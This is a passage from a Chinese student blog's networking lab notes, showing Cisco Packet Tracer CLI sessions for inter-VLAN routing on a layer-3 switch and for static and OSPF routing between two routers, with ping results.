<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Switch(config-<span class="keyword">if</span>)#int vlan <span class="number">10</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#no ip addre</span><br><span class="line">Switch(config-<span class="keyword">if</span>)#no ip address <span class="number">192.168</span><span class="number">.10</span><span class="number">.254</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br></pre></td></tr></table></figure>

<p>或者直接添加新的覆盖</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Switch(config-<span class="keyword">if</span>)#ip address <span class="number">192.168</span><span class="number">.10</span><span class="number">.254</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>

<p>用同样的方法，给vlan20添加192.168.20.254 的ip</p>
<h2 id="给接口配置vlan"><a href="#给接口配置vlan" class="headerlink" title="给接口配置vlan"></a>给接口配置vlan</h2><p>进入gb0/1与gb0/2，分别给两个接口分配vlan10与vlan20</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Switch(config)#interface gigabitEthernet <span class="number">0</span>/<span class="number">1</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#switchport access vlan <span class="number">10</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface Vlan10, changed state to up</span><br><span class="line"></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#exit</span><br><span class="line">Switch(config)#inte</span><br><span class="line">Switch(config)#interface gi</span><br><span class="line">Switch(config)#interface gigabitEthernet <span class="number">0</span>/<span class="number">2</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#switc</span><br><span class="line">Switch(config-<span class="keyword">if</span>)#switchport acc</span><br><span class="line">Switch(config-<span class="keyword">if</span>)#switchport access vlan <span class="number">20</span></span><br><span class="line">% Access VLAN does not exist. Creating vlan <span class="number">20</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINK-<span class="number">5</span>-CHANGED: Interface Vlan20, changed state to up</span><br><span class="line"></span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface Vlan20, changed state to up</span><br><span class="line"></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br></pre></td></tr></table></figure>

<h2 id="给PC配置IP"><a href="#给PC配置IP" class="headerlink" title="给PC配置IP"></a>给PC配置IP</h2><p>给划分在vlan10上的PC机进行IP配置，IP地址设为192.168.10.1，Gateway设为192.168.10.254，另一台同理。</p>
<p>此时使用一台PC机ping另一台PC机，发现不通，但是ping 192.168.20.254是通的，这是因为交换机目前还没有路由功能。在交换机上输入</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Switch(config)#ip routing</span><br></pre></td></tr></table></figure>

<p>这时候就有三层交换机的路由功能了。</p>
<p>这时候就可以ping通了</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">C:\&gt;ping <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">Pinging <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span> <span class="keyword">with</span> <span class="number">32</span> bytes <span class="keyword">of</span> data:</span><br><span class="line"></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span>: bytes=<span class="number">32</span> time=1ms TTL=<span class="number">127</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">127</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span>: bytes=<span class="number">32</span> time=6ms TTL=<span class="number">127</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">127</span></span><br><span class="line"></span><br><span class="line">Ping statistics <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span>:</span><br><span class="line">    Packets: Sent = <span class="number">4</span>, Received = <span class="number">4</span>, Lost = <span class="number">0</span> (<span class="number">0</span>% loss),</span><br><span class="line">Approximate round trip times <span class="keyword">in</span> milli-seconds:</span><br><span class="line">    Minimum = 0ms, Maximum = 6ms, Average = 1ms</span><br></pre></td></tr></table></figure>

<h2 id="不划分vlan的交换机配置"><a href="#不划分vlan的交换机配置" class="headerlink" title="不划分vlan的交换机配置"></a>不划分vlan的交换机配置</h2><p><strong>给接口配置地址</strong></p>
<p>不划分vlan的时候</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Switch#conf t</span><br><span class="line">Enter configuration commands, one per line.  End <span class="keyword">with</span> CNTL/Z.</span><br><span class="line">Switch(config)#int g0/<span class="number">1</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#no swi</span><br><span class="line">Switch(config-<span class="keyword">if</span>)#no switchport </span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface GigabitEthernet0/<span class="number">1</span>, changed state to down</span><br><span class="line"></span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface GigabitEthernet0/<span class="number">1</span>, changed state to up</span><br><span class="line"></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#ip add</span><br><span class="line">Switch(config-<span class="keyword">if</span>)#ip address <span class="number">192.168</span><span class="number">.10</span><span class="number">.254</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#no sh</span><br><span class="line">Switch(config-<span class="keyword">if</span>)#int g0/<span class="number">2</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#no sw</span><br><span class="line">Switch(config-<span class="keyword">if</span>)#no switchport </span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface GigabitEthernet0/<span class="number">2</span>, changed state to down</span><br><span class="line"></span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface GigabitEthernet0/<span class="number">2</span>, changed state to up</span><br><span class="line"></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#ip add</span><br><span class="line">Switch(config-<span class="keyword">if</span>)#ip address <span class="number">192.168</span><span class="number">.20</span><span class="number">.254</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br></pre></td></tr></table></figure>

<p>并给两台主机分别配置 192.168.10.1 和 192.168.20.1的ip，在 Switch 中输入</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Switch#conf t</span><br><span class="line">Enter configuration commands, one per line.  End <span class="keyword">with</span> CNTL/Z.</span><br><span class="line">Switch(config)#ip routing</span><br><span class="line">Switch(config)#</span><br></pre></td></tr></table></figure>

<p>在第一台PC机中输入 ping 192.168.20.1 即可ping通</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">C:\&gt;ping <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">Pinging <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span> <span class="keyword">with</span> <span class="number">32</span> bytes <span class="keyword">of</span> data:</span><br><span class="line"></span><br><span class="line">Request timed out.</span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">127</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">127</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">127</span></span><br><span class="line"></span><br><span class="line">Ping statistics <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span>:</span><br><span class="line">    Packets: Sent = <span class="number">4</span>, Received = <span class="number">3</span>, Lost = <span class="number">1</span> (<span class="number">25</span>% loss),</span><br><span class="line">Approximate round trip times <span class="keyword">in</span> milli-seconds:</span><br><span class="line">    Minimum = 0ms, Maximum = 0ms, Average = 0ms</span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:\&gt;</span><br></pre></td></tr></table></figure>

<h3 id="问题探究"><a href="#问题探究" class="headerlink" title="问题探究"></a>问题探究</h3><ul>
<li>为什么ping第一次的时候会出现一次超时？</li>
</ul>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>默认模式下，交换机工作在二层模式下，需要运行 no switchport 将其修改为三层模式。</p>
<p>交换机需要手动配置网络而路由器不用</p>
]]></content>
      <categories>
        <category>技术篇</category>
        <category>计算机网络原理</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络原理实验四──路由器基本配置</title>
    <url>/archives/Principles-Of-Computer-Networks-Experiment-4.html</url>
    <content><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>路由器基本配置可分为静态路由配置和动态路由配置</p>
<p>两台路由互相连接，并将路由器连接至PC机，路由器之间配置192.168.1.0/24 网段，路由器1与PC1配置192.168.2.0/24网段，路由器2与PC2配置192.168.3.0/24网段</p>
<p>路由器选择1941进行。</p>
<p>使用 Copper Cross-over 连接所有设备，将路由器的0/1口与PC网口相连，路由器0/0口与另一个路由器相连。</p>
<p>更改名称便于区分，将Router0改为R1，将Router1改为R2</p>
<span id="more"></span>

<h1 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h1><h2 id="路由器配置"><a href="#路由器配置" class="headerlink" title="路由器配置"></a>路由器配置</h2><p>进入R1的CLI中，完成 g0/0 的端口配置</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Router#en</span><br><span class="line">Router#conf t</span><br><span class="line">Enter configuration commands, one per line.  End <span class="keyword">with</span> CNTL/Z.</span><br><span class="line">Router(config)#int g0/<span class="number">0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#ip address <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#no sh <span class="comment">// 将端口设为启用</span></span><br><span class="line"></span><br><span class="line">Router(config-<span class="keyword">if</span>)#</span><br></pre></td></tr></table></figure>

<p>同时配置 g0/1 的端口</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Router(config-<span class="keyword">if</span>)#int g0/<span class="number">1</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#ip address <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#no sh</span><br><span class="line"></span><br><span class="line">Router(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINK-<span class="number">5</span>-CHANGED: Interface GigabitEthernet0/<span class="number">1</span>, changed state to up</span><br><span class="line"></span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface GigabitEthernet0/<span class="number">1</span>, changed state to up</span><br></pre></td></tr></table></figure>

<p>此处 g0/1 配置完成后就直接连通了，这是因为PC的接口不需要手动启用，而另一个路由器还未配置完毕，接口需要在配置面板或者输入 no sh 来启用，要禁用的时候可以输入 shutdown</p>
<p>给PC0配置 192.168.2.2 地址，并尝试在命令提示符中 ping 192.168.2.1，成功连通。</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">C:\&gt;ping <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">Pinging <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span> <span class="keyword">with</span> <span class="number">32</span> bytes <span class="keyword">of</span> data:</span><br><span class="line"></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">255</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">255</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">255</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">255</span></span><br><span class="line"></span><br><span class="line">Ping statistics <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span>:</span><br><span class="line">    Packets: Sent = <span class="number">4</span>, Received = <span class="number">4</span>, Lost = <span class="number">0</span> (<span class="number">0</span>% loss),</span><br><span class="line">Approximate round trip times <span class="keyword">in</span> milli-seconds:</span><br><span class="line">    Minimum = 0ms, Maximum = 0ms, Average = 0ms</span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:\&gt;</span><br></pre></td></tr></table></figure>

<p>根据操作给R2的g0/0配置192.168.1.2地址，给g0/1配置192.168.3.1地址</p>
<h2 id="配置静态路由"><a href="#配置静态路由" class="headerlink" title="配置静态路由"></a>配置静态路由</h2><p>在R1上，设置静态路由，让PC0可以访问到PC1</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Router#conf t</span><br><span class="line">Enter configuration commands, one per line.  End <span class="keyword">with</span> CNTL/Z.</span><br><span class="line">Router(config)#ip route <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span></span><br><span class="line"><span class="comment">// 目的网络 子网掩码 下一跳</span></span><br></pre></td></tr></table></figure>

<p>输入do show run查看当前配置</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Router(config)#<span class="keyword">do</span> show run</span><br><span class="line">Building configuration...</span><br><span class="line"></span><br><span class="line">Current configuration : <span class="number">687</span> bytes</span><br><span class="line">!</span><br><span class="line">version <span class="number">15.1</span></span><br><span class="line">no service timestamps log datetime msec</span><br><span class="line">no service timestamps debug datetime msec</span><br><span class="line">no service password-encryption</span><br><span class="line">!</span><br><span class="line">hostname Router</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">no ip cef</span><br><span class="line">no ipv6 cef</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">license udi pid CISCO1941/K9 sn FTX152485P5-</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">spanning-tree mode pvst</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">interface GigabitEthernet0/<span class="number">0</span></span><br><span class="line"> ip address <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line"> duplex auto</span><br><span class="line"> speed auto</span><br><span class="line">!</span><br><span class="line">interface GigabitEthernet0/<span class="number">1</span></span><br><span class="line"> ip address <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line"> duplex auto</span><br><span class="line"> speed auto</span><br><span class="line">!</span><br><span class="line">interface Vlan1</span><br><span class="line"> no ip address</span><br><span class="line"> shutdown</span><br><span class="line">!</span><br><span class="line">ip classless</span><br><span class="line">ip route <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span> </span><br><span class="line">!</span><br><span class="line">ip flow-<span class="keyword">export</span> version <span class="number">9</span></span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">line con <span class="number">0</span></span><br><span class="line">!</span><br><span class="line">line aux <span class="number">0</span></span><br><span class="line">!</span><br><span class="line">line vty <span class="number">0</span> <span class="number">4</span></span><br><span class="line"> login</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>同样也需要在R2上配置到PC0的路由</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Router(config)#ip route <span class="number">192.168</span><span class="number">.2</span><span class="number">.0</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>

<p>从PC0 ping PC1 尝试</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">C:\&gt;ping <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span></span><br><span class="line"></span><br><span class="line">Pinging <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span> <span class="keyword">with</span> <span class="number">32</span> bytes <span class="keyword">of</span> data:</span><br><span class="line"></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span>: bytes=<span class="number">32</span> time=27ms TTL=<span class="number">126</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">126</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">126</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span>: bytes=<span class="number">32</span> time=9ms TTL=<span class="number">126</span></span><br><span class="line"></span><br><span class="line">Ping statistics <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span>:</span><br><span class="line">    Packets: Sent = <span class="number">4</span>, Received = <span class="number">4</span>, Lost = <span class="number">0</span> (<span class="number">0</span>% loss),</span><br><span class="line">Approximate round trip times <span class="keyword">in</span> milli-seconds:</span><br><span class="line">    Minimum = 0ms, Maximum = 27ms, Average = 9ms</span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:\&gt;</span><br></pre></td></tr></table></figure>

<h1 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h1><h2 id="路由配置"><a href="#路由配置" class="headerlink" title="路由配置"></a>路由配置</h2><p>给R1进行配置</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Router&gt;en</span><br><span class="line">Router#conf t</span><br><span class="line">Enter configuration commands, one per line.  End <span class="keyword">with</span> CNTL/Z.</span><br><span class="line">Router(config)#int g0/<span class="number">0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#ip address <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#no sh</span><br><span class="line"></span><br><span class="line">Router(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINK-<span class="number">5</span>-CHANGED: Interface GigabitEthernet0/<span class="number">0</span>, changed state to up</span><br><span class="line"></span><br><span class="line">Router(config-<span class="keyword">if</span>)#</span><br><span class="line">Router(config-<span class="keyword">if</span>)#int g0/<span class="number">1</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#ip address <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#no sh</span><br><span class="line"></span><br><span class="line">Router(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINK-<span class="number">5</span>-CHANGED: Interface GigabitEthernet0/<span class="number">1</span>, changed state to up</span><br><span class="line"></span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface GigabitEthernet0/<span class="number">1</span>, changed state to up</span><br></pre></td></tr></table></figure>

<p>给R2进行配置</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Router&gt;en</span><br><span class="line">Router#conf t</span><br><span class="line">Enter configuration commands, one per line.  End <span class="keyword">with</span> CNTL/Z.</span><br><span class="line">Router(config)#int g0/<span class="number">0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#ip addr <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#no sh</span><br><span class="line"></span><br><span class="line">Router(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINK-<span class="number">5</span>-CHANGED: Interface GigabitEthernet0/<span class="number">0</span>, changed state to up</span><br><span class="line"></span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface GigabitEthernet0/<span class="number">0</span>, changed state to up</span><br><span class="line"></span><br><span class="line">Router(config-<span class="keyword">if</span>)#int g0/<span class="number">1</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#ip addr <span class="number">192.168</span><span class="number">.3</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Router(config-<span class="keyword">if</span>)#no sh</span><br><span class="line"></span><br><span class="line">Router(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINK-<span class="number">5</span>-CHANGED: Interface GigabitEthernet0/<span class="number">1</span>, changed state to up</span><br><span class="line"></span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface GigabitEthernet0/<span class="number">1</span>, changed state to up</span><br></pre></td></tr></table></figure>

<p>并给两个PC配置 192.168.2.2 与 192.168.3.2</p>
<h2 id="路由协议"><a href="#路由协议" class="headerlink" title="路由协议"></a>路由协议</h2><p>在两台路由器上启用ospf协议并公布自己的直连网段</p>
<p>在R1上配置</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Router#conf t</span><br><span class="line">Enter configuration commands, one per line.  End <span class="keyword">with</span> CNTL/Z.</span><br><span class="line">Router(config)#route ospf <span class="number">1</span></span><br><span class="line">Router(config-router)#network <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.255</span> area <span class="number">0</span></span><br><span class="line">Router(config-router)#network <span class="number">192.168</span><span class="number">.2</span><span class="number">.0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.255</span> area <span class="number">1</span></span><br><span class="line">Router(config-router)#</span><br></pre></td></tr></table></figure>

<p>在R2上配置</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Router(config)#route ospf <span class="number">1</span></span><br><span class="line">Router(config-router)#network <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span> area <span class="number">0</span></span><br><span class="line">Router(config-router)#network <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span> area <span class="number">0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">11</span>:<span class="number">30</span>: %OSPF-<span class="number">5</span>-ADJCHG: Process <span class="number">1</span>, Nbr <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span> on GigabitEthernet0/<span class="number">0</span> <span class="keyword">from</span> LOADING to FULL, Loading Done2</span><br><span class="line">Router(config-router)#</span><br></pre></td></tr></table></figure>

<p>查看do show run内容</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Router(config-router)#<span class="keyword">do</span> show run</span><br><span class="line">Building configuration...</span><br><span class="line"></span><br><span class="line">Current configuration : <span class="number">751</span> bytes</span><br><span class="line">!</span><br><span class="line">version <span class="number">15.1</span></span><br><span class="line">no service timestamps log datetime msec</span><br><span class="line">no service timestamps debug datetime msec</span><br><span class="line">no service password-encryption</span><br><span class="line">!</span><br><span class="line">hostname Router</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">ip cef</span><br><span class="line">no ipv6 cef</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">license udi pid CISCO1941/K9 sn FTX15246BJO-</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">spanning-tree mode pvst</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">interface GigabitEthernet0/<span class="number">0</span></span><br><span class="line"> ip address <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line"> duplex auto</span><br><span class="line"> speed auto</span><br><span class="line">!</span><br><span class="line">interface GigabitEthernet0/<span class="number">1</span></span><br><span class="line"> ip address <span class="number">192.168</span><span class="number">.3</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line"> duplex auto</span><br><span class="line"> speed auto</span><br><span class="line">!</span><br><span class="line">interface Vlan1</span><br><span class="line"> no ip address</span><br><span class="line"> shutdown</span><br><span class="line">!</span><br><span class="line">router ospf <span class="number">1</span></span><br><span class="line"> log-adjacency-changes</span><br><span class="line"> network <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.255</span> area <span class="number">0</span></span><br><span class="line"> network <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.255</span> area <span class="number">2</span></span><br><span class="line">!</span><br><span class="line">ip classless</span><br><span class="line">!</span><br><span class="line">ip flow-<span class="keyword">export</span> version <span class="number">9</span></span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">line con <span class="number">0</span></span><br><span class="line">!</span><br><span class="line">line aux <span class="number">0</span></span><br><span class="line">!</span><br><span class="line">line vty <span class="number">0</span> <span class="number">4</span></span><br><span class="line"> login</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">Router(config-router)#</span><br></pre></td></tr></table></figure>

<p>尝试ping另一台PC</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">C:\&gt;ping <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span></span><br><span class="line"></span><br><span class="line">Pinging <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span> <span class="keyword">with</span> <span class="number">32</span> bytes <span class="keyword">of</span> data:</span><br><span class="line"></span><br><span class="line">Request timed out.</span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">126</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">126</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">126</span></span><br><span class="line"></span><br><span class="line">Ping statistics <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.2</span>:</span><br><span class="line">    Packets: Sent = <span class="number">4</span>, Received = <span class="number">3</span>, Lost = <span class="number">1</span> (<span class="number">25</span>% loss),</span><br><span class="line">Approximate round trip times <span class="keyword">in</span> milli-seconds:</span><br><span class="line">    Minimum = 0ms, Maximum = 0ms, Average = 0ms</span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:\&gt;</span><br></pre></td></tr></table></figure>

<p>在R1上查看邻居</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">Router#show ip ospf ne</span><br><span class="line"></span><br><span class="line">Neighbor ID     Pri   State           Dead Time   Address         Interface</span><br><span class="line"><span class="number">192.168</span><span class="number">.3</span><span class="number">.1</span>       <span class="number">1</span>   FULL/BDR        <span class="number">00</span>:<span class="number">00</span>:<span class="number">35</span>    <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span>     GigabitEthernet0/<span class="number">0</span></span><br><span class="line">Router#</span><br></pre></td></tr></table></figure>

